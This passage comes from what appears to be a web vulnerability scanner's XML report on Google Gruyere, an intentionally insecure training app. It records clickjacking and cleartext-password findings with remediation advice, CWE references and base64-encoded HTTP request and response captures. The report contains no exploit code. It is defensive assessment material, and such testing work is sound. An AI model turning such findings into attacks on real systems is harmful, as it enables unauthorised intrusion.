IDkwJTsKICBiYWNrZ3JvdW5kOiAjZmZmZmNjOwogIGJvcmRlcjogM3B4IHNvbGlkICNmZmIxNDk7Cn0KCi5tZW51LXVzZXIgewogIGNvbG9yOiAjMDAwMDAwOwogIGZvbnQtd2VpZ2h0OiBib2xkOwp9CgojbWVudS1sZWZ0IHsKICBmbG9hdDogbGVmdDsKfQoKI21lbnUtbGVmdCBhLCAjbWVudS1sZWZ0IGE6aG92ZXIsICNtZW51LWxlZnQgYTp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDAwMDsKfQoKI21lbnUtcmlnaHQgewogIGZsb2F0OiByaWdodDsKfQoKI21lbnUtcmlnaHQgYSwgI21lbnUtcmlnaHQgYTpob3ZlciwgI21lbnUtcmlnaHQgYTp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDAwMDsKfQoKLm1lc3NhZ2UgewogIHdpZHRoOiA1MCU7CiAgY29sb3I6ICNmZjAwMDA7CiAgYmFja2dyb3VuZDogI2ZmZGRkZDsKICBib3JkZXI6IDJweCBzb2xpZCAjZmYwMDAwOwogIGJvcmRlci1yYWRpdXM6IDFlbTsKICAtbW96LWJvcmRlci1yYWRpdXM6IDFlbTsKICBwYWRkaW5nOiAxMHB4OwogIGZvbnQtd2VpZ2h0OiBib2xkOwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBtYXJnaW46IGF1dG87CiAgbWFyZ2luLXRvcDogMjBweDsKICBtYXJnaW4tYm90dG9tOiAyMHB4Owp9CgppbnB1dCwgdGV4dGFyZWEgewogIGJhY2tncm91bmQtY29sb3I6ICNmZmZmZmY7Cn0KCi5yZWZyZXNoIHsKICBmbG9hdDogY2VudGVyOwogIHdpZHRoOiA5MCU7CiAgdGV4dC1hbGlnbjogcmlnaHQ7CiAgbWFyZ2luOiBhdXRvOwogIHBhZGRpbmctdG9wOiAwOwogIHBhZGRpbmctYm90dG9tOiAycHQ7CiAgbWFyZ2luLXRvcDogMDsKICBtYXJnaW4tYm90dG9tOiAwOwp9CgouaDItd2l0aC1yZWZyZXNoIHsKICBtYXJnaW4tYm90dG9tOiAwOwp9Cgo8L3N0eWxlPgoKPC9oZWFkPgoKPGJvZHk+Cgo8ZGl2IGNsYXNzPSdtZW51Jz4KICA8c3BhbiBpZD0nbWVudS1sZWZ0Jz4KICAgIDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvJz5Ib21lPC9hPgogICAgICAKICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3NuaXBwZXRzLmd0bCc+TXkmbmJzcDtTbmlwcGV0czwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L25ld3NuaXBwZXQuZ3RsJz5OZXcmbmJzcDtTbmlwcGV0PC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvdXBsb2FkLmd0bCc+VXBsb2FkPC9hPgogICAgICAKICA8L3NwYW4+CiAgPHNwYW4gaWQ9J21lbnUtcmlnaHQnPgogICAgICAKICAgICAgPHNwYW4gY2xhc3M9J21lbnUtdXNlcic+CiAgICAgICAgNTU1LTU1NS0wMTk5QGV4YW1wbGUuY29tICZsdDs1NTUtNTU1LTAxOTlAZXhhbXBsZS5jb20mZ3Q7CiAgICAgIDwvc3Bhbj4KICAgICAgCiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9lZGl0cHJvZmlsZS5ndGwnPlByb2ZpbGU8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9sb2dvdXQnPlNpZ24gb3V0PC9hPgogICAgICAKICAgICAgCiAgPC9zcGFuPgo8L2Rpdj4KCjxoMj5HcnV5ZXJlOiBTaWduIHVwPC9oMj4KCjxkaXYgY2xhc3M9J2NvbnRlbnQnPgo8aDM+U2lnbiB1cCBmb3IgYSBuZXcgYWNjb3VudC48L2gzPgoKCgo8Zm9ybSBtZXRob2Q9J2dldCcgYWN0aW9uPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3NhdmVwcm9maWxlJz4KPGlucHV0IHR5cGU9J2hpZGRlbicgbmFtZT0nYWN0aW9uJyB2YWx1ZT0nbmV3Jz4KCjx0YWJsZT48dHI+PHRkPgogICAgVXNlciBuYW1lOgogIDwvdGQ+PHRkPgogICAgPGlucHV0IHR5cGU9J3RleHQnIG5hbWU9J3VpZCcgdmFsdWU9JycgbWF4bGVuZ3RoPScxNic+CjwvdGQ+PC90cj4KPHRyPjx0ZD4KICAgIFBhc3N3b3JkOgogIDwvdGQ+PHRkPgogICAgPGlucHV0IHR5cGU9J3Bhc3N3b3JkJyBuYW1lPSdwdyc+CiAgICA8YnI+PHNwYW4gc3R5bGU9ImNvbG9yOnJlZCI+PGI+V0FSTklORzogR3J1eWVyZSBpcyBub3Qgc2VjdXJlLjxicj4KICAgIERvIG5vdCB1c2UgYSBwYXNzd29yZCB0aGF0IHlvdSB1c2UgZm9yIGFueSByZWFsIHNlcnZpY2UuPGJyPgogICAgRG8gbm90IHVwbG9hZCBhbnkgcGVyc29uYWwgb3IgcHJpdmF0ZSBkYXRhLjwvYj48L3NwYW4+CjwvdGQ+PC90cj4KCgo8aW5wdXQgdHlwZT0naGlkZGVuJyBuYW1lPSdp9hdXRob3InIHZhbHVlPSdUcnVlJz4KCjx0cj48dGQ+PC90ZD48dGQgYWxpZ249J3JpZ2h0Jz4KICAgIDxpbnB1dCB0eXBlPSdzdWJtaXQnIHZhbHVlPSdDcmVhdGUgYWNjb3VudCc+CjwvdGQ+PC90cj4KPC90YWJsZT4KPC9mb3JtPgo8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoK]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>4681095334575124480</serialNumber>
    <type>5245344</type>
    <name><![CDATA[Frameable response (potential Clickjacking)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/newaccount.gtl]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/newaccount.gtl]]></location>
    <severity>Information</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>
<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>
<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options">X-Frame-Options</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/693.html">CWE-693: Protection Mechanism Failure</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbmV3YWNjb3VudC5ndGwgSFRUUC8xLjENCkhvc3Q6IGdvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4xOyBXaW42NDsgeDY0OyBUcmlkZW50LzUuMCkNCkNvbm5lY3Rpb246IGNsb3NlDQpSZWZlcmVyOiBodHRwOi8vZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20vNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2Lw0KQ29va2llOiBHUlVZRVJFX0lEPTQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogNTJjM2NjZWZhNmI4NWZmNjEwNDkyNTUxMGRlM2YzNGUNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTo0MDoxNiBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMzM2MA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IFByb2ZpbGU8L3RpdGxlPgo8c3R5bGU+Ci8qIENvcHlyaWdodCAyMDE3IEdvb2dsZSBJbmMuICovCgpib2R5LCBodG1sLCB0ZCwgc3BhbiwgZGl2LCBpbnB1dCwgdGV4dGFyZWEgewogIGZvbnQtZmFtaWx5OiBzYW5zLXNlcmlmOwogIGZvbnQtc2l6ZTogMTRwdDsKfQoKYm9keSB7CiAgYmFja2dyb3VuZDogdXJsKCdjaGVlc2UucG5nJykgdG9wIGNlbnRlciByZXBlYXQ7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIG9wYWNpdHk6IDAuODA7Cn0KCmgyIHsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgZm9udC1zaXplOiAzMHB0OwogIGZvbnQtd2VpZ2h0OiBib2xkOwp9Cgp0ZCB7CiAgdmVydGljYWwtYWxpZ246IHRvcDsKICBwYWRkaW5nOiA1cHg7Cn0KCmEsIGE6aG92ZXIgewogIHRleHQtZGVjb3JhdGlvbjogdW5kZXJsaW5lOwogIGNvbG9yOiAjMDAwMGJiOwp9CgphOnZpc2l0ZWQgewogIGNvbG9yOiAjYmIwMDAwOwp9CgphLmJ1dHRvbjp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDBiYjsKfQoKLmNvbnRlbnQgewogIHRleHQtYWxpZ246IGxlZnQ7CiAgbWFyZ2luLWxlZnQ6IGF1dG87CiAgbWFyZ2luLXJpZ2h0OiBhdXRvOwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBwYWRkaW5nOiAyMHB4OwogIGJvcmRlcjogM3B4IHNvbGlkICNmZmIxNDk7Cn0KCi5tZW51IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIHBhZGRpbmc6IDEwcHggMjBweCAzNXB4IDIwcHg7CiAgbWFyZ2luLWxlZnQ6IGF1dG87CiAgbWFyZ2luLXJpZ2h0OiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgd2lkdGg6IDkwJTsKICBiYWNrZ3JvdW5kOiAjZmZmZmNjOwogIGJvcmRlcjogM3B4IHNvbGlkICNmZmIxNDk7Cn0KCi5tZW51LXVzZXIgewogIGNvbG9yOiAjMDAwMDAwOwogIGZvbnQtd2VpZ2h0OiBib2xkOwp9CgojbWVudS1sZWZ0IHsKICBmbG9hdDogbGVmdDsKfQoKI21lbnUtbGVmdCBhLCAjbWVudS1sZWZ0IGE6aG92ZXIsICNtZW51LWxlZnQgYTp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDAwMDsKfQoKI21lbnUtcmlnaHQgewogIGZsb2F0OiByaWdodDsKfQoKI21lbnUtcmlnaHQgYSwgI21lbnUtcmlnaHQgYTpob3ZlciwgI21lbnUtcmlnaHQgYTp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDAwMDsKfQoKLm1lc3NhZ2UgewogIHdpZHRoOiA1MCU7CiAgY29sb3I6ICNmZjAwMDA7CiAgYmFja2dyb3VuZDogI2ZmZGRkZDsKICBib3JkZXI6IDJweCBzb2xpZCAjZmYwMDAwOwogIGJvcmRlci1yYWRpdXM6IDFlbTsKICAtbW96LWJvcmRlci1yYWRpdXM6IDFlbTsKICBwYWRkaW5nOiAxMHB4OwogIGZvbnQtd2VpZ2h0OiBib2xkOwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBtYXJnaW46IGF1dG87CiAgbWFyZ2luLXRvcDogMjBweDsKICBtYXJnaW4tYm90dG9tOiAyMHB4Owp9CgppbnB1dCwgdGV4dGFyZWEgewogIGJhY2tncm91bmQtY29sb3I6ICNmZmZmZmY7Cn0KCi5yZWZyZXNoIHsKICBmbG9hdDogY2VudGVyOwogIHdpZHRoOiA5MCU7CiAgdGV4dC1hbGlnbjogcmlnaHQ7CiAgbWFyZ2luOiBhdXRvOwogIHBhZGRpbmctdG9wOiAwOwogIHBhZGRpbmctYm90dG9tOiAycHQ7CiAgbWFyZ2luLXRvcDogMDsKICBtYXJnaW4tYm90dG9tOiAwOwp9CgouaDItd2l0aC1yZWZyZXNoIHsKICBtYXJnaW4tYm90dG9tOiAwOwp9Cgo8L3N0eWxlPgoKPC9oZWFkPgoKPGJvZHk+Cgo8ZGl2IGNsYXNzPSdtZW51Jz4KICA8c3BhbiBpZD0nbWVudS1sZWZ0Jz4KICAgIDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvJz5Ib21lPC9hPgogICAgICAKICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3NuaXBwZXRzLmd0bCc+TXkmbmJzcDtTbmlwcGV0czwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L25ld3NuaXBwZXQuZ3RsJz5OZXcmbmJzcDtTbmlwcGV0PC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvdXBsb2FkLmd0bCc+VXBsb2FkPC9hPgogICAgICAKICA8L3NwYW4+CiAgPHNwYW4gaWQ9J21lbnUtcmlnaHQnPgogICAgICAKICAgICAgPHNwYW4gY2xhc3M9J21lbnUtdXNlcic+CiAgICAgICAgNTU1LTU1NS0wMTk5QGV4YW1wbGUuY29tICZsdDs1NTUtNTU1LTAxOTlAZXhhbXBsZS5jb20mZ3Q7CiAgICAgIDwvc3Bhbj4KICAgICAgCiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9lZGl0cHJvZmlsZS5ndGwnPlByb2ZpbGU8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9sb2dvdXQnPlNpZ24gb3V0PC9hPgogICAgICAKICAgICAgCiAgPC9zcGFuPgo8L2Rpdj4KCjxoMj5HcnV5ZXJlOiBTaWduIHVwPC9oMj4KCjxkaXYgY2xhc3M9J2NvbnRlbnQnPgo8aDM+U2lnbiB1cCBmb3IgYSBuZXcgYWNjb3VudC48L2gzPgoKCgo8Zm9ybSBtZXRob2Q9J2dldCcgYWN0aW9uPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3NhdmVwcm9maWxlJz4KPGlucHV0IHR5cGU9J2hpZGRlbicgbmFtZT0nYWN0aW9uJyB2YWx1ZT0nbmV3Jz4KCjx0YWJsZT48dHI+PHRkPgogICAgVXNlciBuYW1lOgogIDwvdGQ+PHRkPgogICAgPGlucHV0IHR5cGU9J3RleHQnIG5hbWU9J3VpZCcgdmFsdWU9JycgbWF4bGVuZ3RoPScxNic+CjwvdGQ+PC90cj4KPHRyPjx0ZD4KICAgIFBhc3N3b3JkOgogIDwvdGQ+PHRkPgogICAgPGlucHV0IHR5cGU9J3Bhc3N3b3JkJyBuYW1lPSdwdyc+CiAgICA8YnI+PHNwYW4gc3R5bGU9ImNvbG9yOnJlZCI+PGI+V0FSTklORzogR3J1eWVyZSBpcyBub3Qgc2VjdXJlLjxicj4KICAgIERvIG5vdCB1c2UgYSBwYXNzd29yZCB0aGF0IHlvdSB1c2UgZm9yIGFueSByZWFsIHNlcnZpY2UuPGJyPgogICAgRG8gbm90IHVwbG9hZCBhbnkgcGVyc29uYWwgb3IgcHJpdmF0ZSBkYXRhLjwvYj48L3NwYW4+CjwvdGQ+PC90cj4KCgo8aW5wdXQgdHlwZT0naGlkZGVuJyBuYW1lPSdp9hdXRob3InIHZhbHVlPSdUcnVlJz4KCjx0cj48dGQ+PC90ZD48dGQgYWxpZ249J3JpZ2h0Jz4KICAgIDxpbnB1dCB0eXBlPSdzdWJtaXQnIHZhbHVlPSdDcmVhdGUgYWNjb3VudCc+CjwvdGQ+PC90cj4KPC90YWJsZT4KPC9mb3JtPgo8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoK]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>5589777232981021696</serialNumber>
    <type>3145984</type>
    <name><![CDATA[Cleartext submission of password]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/newaccount.gtl]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/newaccount.gtl]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Some applications transmit passwords over unencrypted connections, making them vulnerable to interception. To exploit this vulnerability, an attacker must be suitably positioned to eavesdrop on the victim's network traffic. This scenario typically occurs when a client communicates with the server over an insecure connection such as public Wi-Fi, or a corporate or home network that is shared with a compromised computer. Common defenses such as switched networks are not sufficient to prevent this. An attacker situated in the user's ISP or the application's hosting infrastructure could also perform this attack. Note that an advanced adversary could potentially target any connection made over the Internet's core infrastructure.</p>
<p>Vulnerabilities that result in the disclosure of users' passwords can result in compromises that are extremely difficult to investigate due to obscured audit trails. Even if the application itself only handles non-sensitive information, exposing passwords puts users who have re-used their password elsewhere at risk.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>Applications should use transport-level encryption (SSL or TLS) to protect all sensitive communications passing between the client and the server. Communications that should be protected include the login mechanism and related functionality, and any functions where sensitive data can be accessed or privileged actions can be performed. These areas should employ their own session handling mechanism, and the session tokens used should never be transmitted over unencrypted communications. If HTTP cookies are used for transmitting session tokens, then the secure flag should be set to prevent transmission over clear-text HTTP.</p>]]></remediationBackground>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/319.html">CWE-319: Cleartext Transmission of Sensitive Information</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The page contains a form with the following action URL, which is submitted over clear-text HTTP:<ul><li>http://google-gruyere.appspot.com/421683968655469260586300829583795792326/saveprofile</li></ul>The form contains the following password field:<ul><li>pw</li></ul>]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbmV3YWNjb3VudC5ndGwgSFRUUC8xLjENCkhvc3Q6IGdvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4xOyBXaW42NDsgeDY0OyBUcmlkZW50LzUuMCkNCkNvbm5lY3Rpb246IGNsb3NlDQpSZWZlcmVyOiBodHRwOi8vZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20vNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2Lw0KQ29va2llOiBHUlVZRVJFX0lEPTQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogNTJjM2NjZWZhNmI4NWZmNjEwNDkyNTUxMGRlM2YzNGUNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTo0MDoxNiBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMzM2MA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IFByb2ZpbGU8L3RpdGxlPgo8c3R5bGU+Ci8qIENvcHlyaWdodCAyMDE3IEdvb2dsZSBJbmMuICovCgpib2R5LCBodG1sLCB0ZCwgc3BhbiwgZGl2LCBpbnB1dCwgdGV4dGFyZWEgewogIGZvbnQtZmFtaWx5OiBzYW5zLXNlcmlmOwogIGZvbnQtc2l6ZTogMTRwdDsKfQoKYm9keSB7CiAgYmFja2dyb3VuZDogdXJsKCdjaGVlc2UucG5nJykgdG9wIGNlbnRlciByZXBlYXQ7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIG9wYWNpdHk6IDAuODA7Cn0KCmgyIHsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgZm9udC1zaXplOiAzMHB0OwogIGZvbnQtd2VpZ2h0OiBib2xkOwp9Cgp0ZCB7CiAgdmVydGljYWwtYWxpZ246IHRvcDsKICBwYWRkaW5nOiA1cHg7Cn0KCmEsIGE6aG92ZXIgewogIHRleHQtZGVjb3JhdGlvbjogdW5kZXJsaW5lOwogIGNvbG9yOiAjMDAwMGJiOwp9CgphOnZpc2l0ZWQgewogIGNvbG9yOiAjYmIwMDAwOwp9CgphLmJ1dHRvbjp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDBiYjsKfQoKLmNvbnRlbnQgewogIHRleHQtYWxpZ246IGxlZnQ7CiAgbWFyZ2luLWxlZnQ6IGF1dG87CiAgbWFyZ2luLXJpZ2h0OiBhdXRvOwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBwYWRkaW5nOiAyMHB4OwogIGJvcmRlcjogM3B4IHNvbGlkICNmZmIxNDk7Cn0KCi5tZW51IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIHBhZGRpbmc6IDEwcHggMjBweCAzNXB4IDIwcHg7CiAgbWFyZ2luLWxlZnQ6IGF1dG87CiAgbWFyZ2luLXJpZ2h0OiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgd2lkdGg6IDkwJTsKICBiYWNrZ3JvdW5kOiAjZmZmZmNjOwogIGJvcmRlcjogM3B4IHNvbGlkICNmZmIxNDk7Cn0KCi5tZW51LXVzZXIgewogIGNvbG9yOiAjMDAwMDAwOwogIGZvbnQtd2VpZ2h0OiBib2xkOwp9CgojbWVudS1sZWZ0IHsKICBmbG9hdDogbGVmdDsKfQoKI21lbnUtbGVmdCBhLCAjbWVudS1sZWZ0IGE6aG92ZXIsICNtZW51LWxlZnQgYTp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDAwMDsKfQoKI21lbnUtcmlnaHQgewogIGZsb2F0OiByaWdodDsKfQoKI21lbnUtcmlnaHQgYSwgI21lbnUtcmlnaHQgYTpob3ZlciwgI21lbnUtcmlnaHQgYTp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDAwMDsKfQoKLm1lc3NhZ2UgewogIHdpZHRoOiA1MCU7CiAgY29sb3I6ICNmZjAwMDA7CiAgYmFja2dyb3VuZDogI2ZmZGRkZDsKICBib3JkZXI6IDJweCBzb2xpZCAjZmYwMDAwOwogIGJvcmRlci1yYWRpdXM6IDFlbTsKICAtbW96LWJvcmRlci1yYWRpdXM6IDFlbTsKICBwYWRkaW5nOiAxMHB4OwogIGZvbnQtd2VpZ2h0OiBib2xkOwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBtYXJnaW46IGF1dG87CiAgbWFyZ2luLXRvcDogMjBweDsKICBtYXJnaW4tYm90dG9tOiAyMHB4Owp9CgppbnB1dCwgdGV4dGFyZWEgewogIGJhY2tncm91bmQtY29sb3I6ICNmZmZmZmY7Cn0KCi5yZWZyZXNoIHsKICBmbG9hdDogY2VudGVyOwogIHdpZHRoOiA5MCU7CiAgdGV4dC1hbGlnbjogcmlnaHQ7CiAgbWFyZ2luOiBhdXRvOwogIHBhZGRpbmctdG9wOiAwOwogIHBhZGRpbmctYm90dG9tOiAycHQ7CiAgbWFyZ2luLXRvcDogMDsKICBtYXJnaW4tYm90dG9tOiAwOwp9CgouaDItd2l0aC1yZWZyZXNoIHsKICBtYXJnaW4tYm90dG9tOiAwOwp9Cgo8L3N0eWxlPgoKPC9oZWFkPgoKPGJvZHk+Cgo8ZGl2IGNsYXNzPSdtZW51Jz4KICA8c3BhbiBpZD0nbWVudS1sZWZ0Jz4KICAgIDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvJz5Ib21lPC9hPgogICAgICAKICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3NuaXBwZXRzLmd0bCc+TXkmbmJzcDtTbmlwcGV0czwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L25ld3NuaXBwZXQuZ3RsJz5OZXcmbmJzcDtTbmlwcGV0PC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvdXBsb2FkLmd0bCc+VXBsb2FkPC9hPgogICAgICAKICA8L3NwYW4+CiAgPHNwYW4gaWQ9J21lbnUtcmlnaHQnPgogICAgICAKICAgICAgPHNwYW4gY2xhc3M9J21lbnUtdXNlcic+CiAgICAgICAgNTU1LTU1NS0wMTk5QGV4YW1wbGUuY29tICZsdDs1NTUtNTU1LTAxOTlAZXhhbXBsZS5jb20mZ3Q7CiAgICAgIDwvc3Bhbj4KICAgICAgCiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9lZGl0cHJvZmlsZS5ndGwnPlByb2ZpbGU8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9sb2dvdXQnPlNpZ24gb3V0PC9hPgogICAgICAKICAgICAgCiAgPC9zcGFuPgo8L2Rpdj4KCjxoMj5HcnV5ZXJlOiBTaWduIHVwPC9oMj4KCjxkaXYgY2xhc3M9J2NvbnRlbnQnPgo8aDM+U2lnbiB1cCBmb3IgYSBuZXcgYWNjb3VudC48L2gzPgoKCgo8Zm9ybSBtZXRob2Q9J2dldCcgYWN0aW9uPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3NhdmVwcm9maWxlJz4KPGlucHV0IHR5cGU9J2hpZGRlbicgbmFtZT0nYWN0aW9uJyB2YWx1ZT0nbmV3Jz4KCjx0YWJsZT48dHI+PHRkPgogICAgVXNlciBuYW1lOgogIDwvdGQ+PHRkPgogICAgPGlucHV0IHR5cGU9J3RleHQnIG5hbWU9J3VpZCcgdmFsdWU9JycgbWF4bGVuZ3RoPScxNic+CjwvdGQ+PC90cj4KPH